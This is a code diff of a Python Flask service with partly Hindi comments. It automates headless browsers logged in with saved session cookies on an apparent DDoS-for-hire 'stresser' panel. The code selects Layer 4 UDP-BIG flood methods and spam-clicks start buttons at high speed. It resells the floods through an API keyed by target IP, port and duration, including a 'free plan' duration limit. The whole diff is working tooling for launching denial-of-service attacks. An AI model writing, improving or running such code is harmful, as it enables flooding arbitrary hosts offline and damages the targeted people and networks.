@@ -18,6 +18,7 @@ PORT              = 3938
 MAX_PRELOADED     = 5        # 4GB RAM ke liye 5 best hai
 TOKEN_ROTATE_SEC  = 20
 SPAM_SLEEP        = 0.01     # Fast Spam (100 CPS)
+MAX_DURATION      = 30       # Free plan limit
 
 # ========== GLOBALS ==========
 sessions             = []
@@ -129,19 +130,16 @@ def check_password(req):
     return (req.args.get('password') or req.headers.get('X-Password')) == ADMIN_PASSWORD
 
 
-# ========== SCREENSHOT ==========
+# ========== SCREENSHOT & METHOD ==========
 def take_screenshot(page, name):
     try:
         page.screenshot(path=os.path.join(SS_FOLDER, name), full_page=False)
     except Exception:
         pass
 
-
-# ========== FAST METHOD SELECT ==========
 def select_method(page, worker_number):
     for retry in range(3):
         try:
-            # Layer 4
             page.evaluate("""() => {
                 const b = document.querySelectorAll('button');
                 for (const x of b) {
@@ -149,9 +147,7 @@ def select_method(page, worker_number):
                     if (t.includes('Network endpoint') || t.includes('Layer 4')) { x.click(); return; }
                 }
             }""")
-            time.sleep(0.5)
-
-            # Browse
+            time.sleep(1)
             page.evaluate("""() => {
                 const s = document.querySelector('span.app-method-trigger-action');
                 if (s) { s.click(); return; }
@@ -161,8 +157,6 @@ def select_method(page, worker_number):
                 }
             }""")
             time.sleep(1.5)
-
-            # UDP
             page.evaluate("""() => {
                 const b = document.querySelectorAll('button');
                 for (const x of b) {
@@ -170,8 +164,6 @@ def select_method(page, worker_number):
                 }
             }""")
             time.sleep(1)
-
-            # UDP-BIG
             clicked = page.evaluate("""() => {
                 const opts = document.querySelectorAll('button[role="option"]');
                 for (const o of opts) {
@@ -180,21 +172,20 @@ def select_method(page, worker_number):
                 }
                 return false;
             }""")
-            if clicked:
-                return True
-        except Exception:
-            time.sleep(1)
+            if clicked: return True
+        except Exception as e:
+            print(f"[Worker-{worker_number}] ⚠️ Method retry {retry+1}: {e}")
+            time.sleep(2)
     return False
 
 
-# ========== PERSISTENT WORKER ==========
+# ========== PERSISTENT WORKER (Fixed) ==========
 def worker_thread(worker_number):
     global active_attacks, workers_loading, attack_counter
 
-    browser = None
-    page = None
-    
-    while True:  # ⚡ Worker marta nahi, loop chalta rehta hai
+    while True:
+        browser = None
+        page = None
         job = None
         loading_decreased = False
         session = get_next_session_rotated()
@@ -202,32 +193,46 @@ def worker_thread(worker_number):
         try:
             print(f"[Worker-{worker_number}] 🌐 Session {session['id']} | Opening...")
 
+            # ⚡ FIX: Memory flags for 4GB VPS
             browser = launch(
                 headless=True,
-                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', 
-                      '--single-process', '--no-zygote', '--disable-extensions']
+                args=[
+                    '--no-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-gpu',
+                    '--single-process',
+                    '--no-zygote',
+                    '--disable-extensions'
+                ]
             )
             page = browser.new_page()
             page.set_viewport_size({"width": 1280, "height": 720})
             page.context.add_cookies(session["cookies"])
 
-            # ⚡ FAST LOAD
+            # ⚡ FIX: Fast load with DOMContentLoaded
             page.goto("https://retrostress.net/panel", wait_until="domcontentloaded", timeout=60000)
+            
+            # Wait for page to render
+            try:
+                page.wait_for_selector('button', timeout=15000)
+            except:
+                pass
             time.sleep(2)
 
             if "auth" in page.url or "login" in page.url:
                 print(f"[Worker-{worker_number}] ❌ Session expired!")
                 browser.close()
+                time.sleep(2)
                 continue
 
             if not select_method(page, worker_number):
                 print(f"[Worker-{worker_number}] ❌ Method failed")
                 browser.close()
+                time.sleep(2)
                 continue
 
-            print(f"[Worker-{worker_number}] ✅ Ready! Waiting for job...")
+            print(f"[Worker-{worker_number}] ✅ Ready!")
 
-            # Pool me wapas daalo
             with workers_loading_lock:
                 if workers_loading > 0:
                     workers_loading -= 1
@@ -237,11 +242,11 @@ def worker_thread(worker_number):
                 if len(worker_pool) < MAX_PRELOADED:
                     worker_pool.append(worker_number)
 
-            # ⚡ WAIT FOR JOB (30 sec timeout)
+            # ⚡ WAIT FOR JOB (30 sec idle timeout)
             try:
                 job = attack_queue.get(timeout=30)
             except queue.Empty:
-                print(f"[Worker-{worker_number}] 💤 Idle timeout. Restarting browser...")
+                print(f"[Worker-{worker_number}] 💤 Idle timeout.")
                 browser.close()
                 continue
 
@@ -272,6 +277,8 @@ def worker_thread(worker_number):
             spam_duration = max(duration - 1, 1)
             start_time = time.time()
             click_count = 0
+            start_clicks = 0
+            retry_clicks = 0
 
             while time.time() - start_time < spam_duration:
                 try:
@@ -285,26 +292,31 @@ def worker_thread(worker_number):
                         }
                         return { start: sc, retry: rc };
                     }""")
-                    click_count += (result.get('start', 0) + result.get('retry', 0))
+                    s = result.get('start', 0) if result else 0
+                    r = result.get('retry', 0) if result else 0
+                    click_count += s + r
+                    start_clicks += s
+                    retry_clicks += r
                     
                     if click_count % 200 == 0 and click_count > 0:
                         cps = int(click_count / max(time.time() - start_time, 1))
-                        print(f"[Worker-{worker_number}] ⚡ {click_count} | {cps}/s")
+                        print(f"[Worker-{worker_number}] ⚡ {click_count} | {cps}/s | s:{start_clicks} r:{retry_clicks}")
                     time.sleep(SPAM_SLEEP)
                 except:
                     time.sleep(SPAM_SLEEP)
 
             print(f"[Worker-{worker_number}] ✅ DONE! {click_count} clicks")
             
-            # Attack ke baad panel reset
+            # Reset panel for next attack
             try:
                 page.reload(wait_until="domcontentloaded")
-                time.sleep(1)
+                time.sleep(2)
             except:
                 pass
 
         except Exception as e:
-            print(f"[Worker-{worker_number}] ❌ Error: {e}")
+            print(f"[Worker-{worker_number}] ❌ CRITICAL ERROR: {e}")
+            time.sleep(5)  # Wait before retrying
         
         finally:
             if not loading_decreased:
@@ -315,13 +327,12 @@ def worker_thread(worker_number):
                 with sessions_lock:
                     active_attacks -= 1
             
-            # Agar browser crash ho gaya to close karo
             if browser:
                 try:
                     browser.close()
                 except:
                     pass
-            time.sleep(1) # Loop dobara start hone se pehle 1 sec wait
+            time.sleep(1) # Loop dobara start hone se pehle wait
 
 
 # ========== POOL MANAGER ==========
@@ -344,7 +355,7 @@ def pool_manager():
                         worker_num = worker_counter
                     t = threading.Thread(target=worker_thread, args=(worker_num,), daemon=True)
                     t.start()
-                    time.sleep(0.5)
+                    time.sleep(1) # Ek ke baad ek launch ho
         except Exception as e:
             print(f"[Pool] ❌ {e}")
         time.sleep(2)
@@ -375,6 +386,9 @@ def attack_url(ip, port, time_sec):
     api_key = request.args.get('key') or request.headers.get('X-API-Key')
     if not api_key or api_key not in api_keys or not api_keys[api_key]["active"]:
         return jsonify({"status": "error", "message": "❌ Invalid Key"}), 403
+
+    if time_sec > MAX_DURATION or time_sec < 1:
+        return jsonify({"status": "error", "message": f"❌ Duration: 1-{MAX_DURATION}s"}), 400
 
     with worker_pool_lock:
         pool_size = len(worker_pool)
